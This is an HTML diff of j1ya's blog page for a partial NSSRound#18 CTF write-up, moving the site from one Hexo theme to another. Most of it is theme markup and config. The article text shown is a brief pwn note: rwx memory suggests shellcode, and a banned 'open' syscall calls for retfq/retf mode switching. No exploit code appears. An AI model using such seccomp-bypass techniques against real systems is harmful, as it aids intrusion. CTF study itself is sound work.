@@ -1,928 +1,1322 @@
-
-
 <!DOCTYPE html>
-<html lang="zh-CN" data-default-color-scheme=auto>
-
-
-
+<html lang="zh-CN">
 <head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/China.jpg">
-  <link rel="icon" href="/img/China.jpg">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="theme-color" content="#2f4154">
-  <meta name="author" content="j1ya">
-  <meta name="keywords" content="">
-  
-    <meta name="description" content="pwnHappyCTF看到rwx基本上是shellcode     vuln函数反编译不了，问题不大   敲，后面发现把open给禁了，那得用retfq和retf了   1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    
+    <meta name="author" content="j1ya">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes ASAP (before DOMContentLoaded)
+            (function() {
+                const addBodyClass = () => {
+                    const b = document.body;
+                    if (!b) return false;
+                    b.classList.add(theme + "-mode");
+                    return true;
+                };
+
+                // Try immediately
+                if (addBodyClass()) return;
+
+                // Observe until body exists
+                const mo = new MutationObserver(() => {
+                    if (addBodyClass()) mo.disconnect();
+                });
+                mo.observe(document.documentElement, { childList: true, subtree: true });
+            })();
+        })();
+    </script>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://j1ya-22.github.io/2024/02/16/nssround18部分wp/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:type" content="article">
 <meta property="og:title" content="NSSRound#18部分wp">
 <meta property="og:url" content="https://j1ya-22.github.io/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/index.html">
 <meta property="og:site_name" content="j1ya">
-<meta property="og:description" content="pwnHappyCTF看到rwx基本上是shellcode     vuln函数反编译不了，问题不大   敲，后面发现把open给禁了，那得用retfq和retf了   1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://j1ya-22.github.io/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707882413729-a8b684db-8573-447e-a278-5447c939771a-170808409444444.png">
-<meta property="og:image" content="https://j1ya-22.github.io/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707882320571-ffb866fd-3a4b-4970-9dd8-2565512afce9-170808409444446.png">
-<meta property="og:image" content="https://j1ya-22.github.io/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707879608622-3f721439-e2cf-4a39-a7a5-7452e147cf52-170808409444448.png">
-<meta property="og:image" content="https://j1ya-22.github.io/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708081299573-447e5ca9-254f-4562-87cd-130c5e595733.png">
-<meta property="og:image" content="https://j1ya-22.github.io/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707896480014-6513872d-2a7a-4f57-a6b7-27fe2aa5a271.png">
-<meta property="og:image" content="https://j1ya-22.github.io/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707896510027-81ff0497-65d7-4ea5-9c79-fd25036fd396.png">
-<meta property="og:image" content="https://j1ya-22.github.io/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708050502254-af67ad5d-02e9-4c98-9e25-8a52fa81bd84.png">
-<meta property="og:image" content="https://j1ya-22.github.io/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708050549029-968a083a-1240-484f-b9f2-b86796fdb424.png">
-<meta property="og:image" content="https://j1ya-22.github.io/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707900162098-9fff77af-2806-41ac-866c-8991156082c7.png">
-<meta property="og:image" content="https://j1ya-22.github.io/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707901366902-a403543b-7c1e-47b6-ad11-9776325c9cd8.png">
-<meta property="og:image" content="https://j1ya-22.github.io/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707902129974-d2e72bff-cce6-4c4d-affd-f32e5f84bf3f.png">
-<meta property="og:image" content="https://j1ya-22.github.io/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707902261420-02f82295-67c4-477e-8674-c6ad06b5b9f1.png">
-<meta property="og:image" content="https://j1ya-22.github.io/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707905579072-8d1e25a1-ec40-4bb9-9c35-60d95850cc67.png">
-<meta property="og:image" content="https://j1ya-22.github.io/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708008328700-57e3f9c3-60ba-4b81-b999-6e1791f9855f.png">
-<meta property="og:image" content="https://j1ya-22.github.io/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708008674108-1e115c0f-0266-4197-9f3b-d3bbd9ae9567.png">
-<meta property="og:image" content="https://j1ya-22.github.io/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708008835792-7cb82437-2578-47d6-a225-1df4bbec6959.png">
-<meta property="og:image" content="https://j1ya-22.github.io/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708008882947-d72a0c6a-4e9f-4efb-9dc0-83df6e4af26b.png">
-<meta property="og:image" content="https://j1ya-22.github.io/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708008910188-821abe3f-4db0-440d-9c19-04fc8c88a72a.png">
-<meta property="og:image" content="https://j1ya-22.github.io/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708009108153-0bd6ce8f-8d07-4512-bf4c-d518cbb331f3.png">
-<meta property="og:image" content="https://j1ya-22.github.io/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708009225510-6cfe7d63-9df6-4784-a4ef-2e73f8f09c5f.png">
-<meta property="og:image" content="https://j1ya-22.github.io/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708009396841-b920b4d0-fa87-45f9-9058-ee4b5bf7bc4d.png">
-<meta property="og:image" content="https://j1ya-22.github.io/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708009508484-d19253c5-2bba-428e-b6ea-107e6f5171ee.png">
-<meta property="og:image" content="https://j1ya-22.github.io/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708053405853-dab66655-2aa2-48ae-86cf-56d3488772a7.png">
-<meta property="og:image" content="https://j1ya-22.github.io/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708053940754-b3a3b96a-3c0b-458e-a3c4-d72451611a5c.png">
-<meta property="og:image" content="https://j1ya-22.github.io/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708054072607-ad2c4d64-f471-4eb1-b285-19581f54694d.png">
-<meta property="og:image" content="https://j1ya-22.github.io/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708054194721-3290df63-dc66-4aa8-941d-49c46082fa3e.png">
-<meta property="og:image" content="https://j1ya-22.github.io/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708063124709-72492c56-0475-4245-8080-1c845e3e67ad.png">
-<meta property="og:image" content="https://j1ya-22.github.io/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708065409901-24731386-9db8-4c83-a1b8-df148d58cc6e.png">
-<meta property="og:image" content="https://j1ya-22.github.io/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707897006283-e11c8e66-60d8-453b-bbb4-4923172ebad4.png">
-<meta property="og:image" content="https://j1ya-22.github.io/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707897289557-b1b0d72c-33b7-452d-b9d9-3c335f494b72.png">
-<meta property="og:image" content="https://j1ya-22.github.io/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707897442652-5643f483-589a-42c4-a7ee-ac578ca09b93.png">
-<meta property="og:image" content="https://j1ya-22.github.io/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707897125919-70ff2871-f8fc-49d1-af17-80f663910385.png">
-<meta property="og:image" content="https://j1ya-22.github.io/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707898430820-55d77299-2129-495c-8f4b-9674a7e705b3.png">
-<meta property="og:image" content="https://j1ya-22.github.io/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708007743062-01c8b0da-a225-42ab-8bf6-0c5ee8524710.png">
-<meta property="og:image" content="https://j1ya-22.github.io/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707899075674-94d6549e-74b1-4fa9-9a6d-11d6ac0001c0.png">
-<meta property="og:image" content="https://j1ya-22.github.io/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707899762242-e173afcc-df88-420a-a26c-f2ae5bb6c5c8.png">
-<meta property="og:image" content="https://j1ya-22.github.io/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1708009841111-baa8ea56-12cd-4ef5-bb68-60ab768691fb.png">
+<meta property="og:image" content="https://j1ya-22.github.io/images/redefine-og.webp">
 <meta property="article:published_time" content="2024-02-16T11:42:42.000Z">
 <meta property="article:modified_time" content="2026-01-09T03:06:28.102Z">
 <meta property="article:author" content="j1ya">
 <meta property="article:tag" content="unity逆向">
 <meta property="article:tag" content="VM">
 <meta property="article:tag" content="shellcode">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://j1ya-22.github.io/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707882413729-a8b684db-8573-447e-a278-5447c939771a-170808409444444.png">
-  
-  
-    <meta name="referrer" content="no-referrer-when-downgrade">
-  
-  
-  <title>NSSRound#18部分wp - j1ya</title>
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
-
-
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
-
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-<!-- Do not modify the link that theme dependent icons -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
-  
-    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
-  
-
-
-
-
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"j1ya-22.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"5oPqGOgpqzM186wdJq3YyrcV-gzGzoHsz","app_key":"tdZv3tC3tP1IszSKxEodRe6e","server_url":null,"path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml","include_content_in_search":true};
-
-    if (CONFIG.web_analytics.follow_dnt) {
-      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
-      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
-    }
-  </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
-  
-
-  
-
-  
-    <!-- Google tag (gtag.js) -->
-    <script async>
-      if (!Fluid.ctx.dnt) {
-        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
-          window.dataLayer = window.dataLayer || [];
-          function gtag() {
-            dataLayer.push(arguments);
-          }
-          gtag('js', new Date());
-          gtag('config', '');
-        });
-      }
-    </script>
-  
-
-  
-
-  
-
-  
-
-  
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://j1ya-22.github.io/images/redefine-og.webp">
     
-  
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/img/China.jpg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/img/China.jpg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/img/China.jpg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            NSSRound#18部分wp | j1ya&#39;s blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
 
 
+    <!--- Inject Part-->
+    
 
-  
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"j1ya-22.github.io","root":"/","language":"zh-CN"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"<span style=\"display:none\"></span>","subtitle":{"text":["There is only one heroism in the world:<br>to see the world as it is, and to love it."],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":80,"backing_speed":80,"starting_delay":500,"backing_delay":2200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.4rem","subtitle_size":"2.35rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":[{"icon":"fa-brands fa-github","url":null},{"icon":"fa-brands fa-twitter","url":null},{"icon":"fa-solid fa-at","url":"you@example.com"},{"icon":"fa-brands fa-telegram","url":null},{"icon":"/images/custom-icon.svg","url":null}],"qrs":[{"icon":"fa-brands fa-weixin","qr":null},{"icon":"/images/custom-icon.svg","qr":null}]}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1","theme":{"light":"default","dark":"dark"}}},"version":"2.9.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives/","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories/","icon":"fa-regular fa-folder"},"Tags":{"path":"/tags/","icon":"fa-regular fa-tags"},"About":{"icon":"fa-regular fa-user","path":"/about/"},"Friends":{"path":"/links/","icon":"fa-solid fa-link"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur","masonry":{"batch_size":12,"initial_batch_size":24}},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footer":{"runtime":true,"icon":"<i class=\"fa-solid fa-heart fa-beat\" style=\"--fa-animation-duration: 0.5s; color: #f54545\"></i>","start":"2022/8/17 11:45:14","statistics":true,"customize":null,"icp":{"enable":false,"number":null,"url":null}},"footerStart":"2022/8/17 11:45:14","mermaid":{"style":{"light":"default","dark":"dark"}}};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.i18n = {"search":"站内搜索您需要的内容...","toc":"目录","prev":"上一页","next":"下一页","prev_posts":"上一篇","next_posts":"下一篇","page":"第 %d 页","recent_posts":"最新文章","share":"分享","powered_by":"由 %s 驱动","theme":"主题","rss_feed":"RSS Feed","category":"分类","categories":"分类","tag":"标签","tags":"标签","post":"文章","posts":"文章","tagcloud":"标签云","comment":"评论","comments":"评论","top":"置顶","sticky":"置顶","go-back-home":"回到首页","masonry_loading":"照片加载中...","image_viewer":"图片查看器","close":"关闭","exif":{"title":"EXIF","cards":{"camera":"相机","lens":"镜头","exposure":"曝光","other":"其他"},"fields":{"make":"品牌","model":"机型","date_taken":"拍摄时间","lens_model":"镜头","focal_length":"焦距","focus_mode":"对焦模式","shutter":"快门","aperture":"光圈","iso":"感光度","exposure_program":"曝光程序","exposure_compensation":"曝光补偿","metering_mode":"测光模式","flash":"闪光灯","white_balance":"白平衡","latitude":"纬度","longitude":"经度","altitude":"海拔"},"status":{"loading":"加载中...","no_exif":"无 EXIF 信息","library_missing":"EXIF 库未加载","image_source_missing":"图片地址不可用","unavailable":"EXIF 不可用（可能被 CORS 阻止或缺少元数据）","flag_unavailable":"EXIF 不可用"}},"home":"首页","archive":"归档","archives":"归档","about":"关于","links":"链接","link":"链接","friends":"友情链接","friend":"友情链接","timeline":"时间轴","shuoshuo":"说说","bookmarks":"书签","site_uv":"访问人数","site_pv":"总访问量","read_more":"阅读全文","wordcount":"字","min2read":"分钟","changelog":"更新日志","status":"状态","runtime":"博客已运行","days":"天","hours":"小时","minutes":"分钟","seconds":"秒","optimized_by":"并由 Evan 进行优化","rights":"版权所有","site_posts":"共撰写了 %s 篇文章","site_wordcount":"共 %s 字","copyright":{"title":"标题","author":"作者","link":"链接","create_time":"创建于","update_time":"更新于","license_title":"版权声明","license_content":"本文章采用 %s 进行许可。","all_rights_reserved":"版权所有 &#169 %s，禁止转载。","public_domain":"本文为公有领域作品，可自由转载、引用。"},"ago":{"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"},"create_time":"创建","update_time":"更新","expired":"这篇文章最后更新于 %s 天前，内容可能已经过时。"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
 <meta name="generator" content="Hexo 7.0.0"></head>
 
 
 <body>
-  
+	<div class="progress-bar-container">
+	
 
-  <header>
-    
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
 
-<div class="header-inner" style="height: 70vh;">
-  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">
-      <strong>j1ya</strong>
-    </a>
+<main class="page-container" id="swup">
 
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
+	
 
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/" target="_self">
-                <i class="iconfont icon-home-fill"></i>
-                <span>首页</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/" target="_self">
-                <i class="iconfont icon-archive-fill"></i>
-                <span>归档</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/" target="_self">
-                <i class="iconfont icon-category-fill"></i>
-                <span>分类</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/" target="_self">
-                <i class="iconfont icon-tags-fill"></i>
-                <span>标签</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/" target="_self">
-                <i class="iconfont icon-user-fill"></i>
-                <span>关于</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/links/" target="_self">
-                <i class="iconfont icon-link-fill"></i>
-                <span>友链</span>
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
-              <i class="iconfont icon-search"></i>
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                j1ya&#39;s blog
+                
             </a>
-          </li>
-          
-        
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
-              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
-            </a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-</nav>
-
-  
-
-<div id="banner" class="banner" parallax=true
-     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
-  <div class="full-bg-img">
-    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-      <div class="banner-text text-center fade-in-up">
-        <div class="h2">
-          
-            <span id="subtitle" data-typed-text="NSSRound#18部分wp"></span>
-          
         </div>
 
-        
-          
-  <div class="mt-3">
-    
-    
-      <span class="post-meta">
-        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-02-16 19:42" pubdate>
-          2024年2月16日 晚上
-        </time>
-      </span>
-    
-  </div>
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
 
-  <div class="mt-1">
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-chart"></i>
-        
-          1.2k 字
-        
-      </span>
-    
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    首页
+                                    
+                                </a>
 
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-clock-fill"></i>
-        
-        
-        
-          11 分钟
-        
-      </span>
-    
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
 
-    
-    
-      
-        <span id="busuanzi_container_page_pv" style="display: none">
-          <i class="iconfont icon-eye" aria-hidden="true"></i>
-          <span id="busuanzi_value_page_pv"></span> 次
-        </span>
-        
-      
-    
-  </div>
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives/"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    归档
+                                    
+                                </a>
 
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
 
-        
-      </div>
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories/"
+                                        >
+                                    <i class="fa-regular fa-folder fa-fw"></i>
+                                    分类
+                                    
+                                </a>
 
-      
-    </div>
-  </div>
-</div>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
 
-</div>
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags/"
+                                        >
+                                    <i class="fa-regular fa-tags fa-fw"></i>
+                                    标签
+                                    
+                                </a>
 
-  </header>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
 
-  <main>
-    
-      
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/about/"
+                                        >
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    关于
+                                    
+                                </a>
 
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
 
-    </div>
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/links/"
+                                        >
+                                    <i class="fa-solid fa-link fa-fw"></i>
+                                    友情链接
+                                    
+                                </a>
 
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div id="board">
-          <article class="post-content mx-auto">
-            <h1 id="seo-header">NSSRound#18部分wp</h1>
-            
-            
-              <div class="markdown-body">
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
                 
-                <h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="HappyCTF"><a href="#HappyCTF" class="headerlink" title="HappyCTF"></a>HappyCTF</h2><p>看到rwx基本上是shellcode</p>
-<img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707882413729-a8b684db-8573-447e-a278-5447c939771a-170808409444444.png" srcset="/img/loading.gif" lazyload class="" title="img">
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
 
-<img src="/2024/02/16/NSSRound18%E9%83%A8%E5%88%86wp/1707882320571-ffb866fd-3a4b-4970-9dd8-2565512afce9-170808409444446.png" srcset="/img/loading.gif" lazyload class="" title="img">
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                首页
+                            </span>
+                            
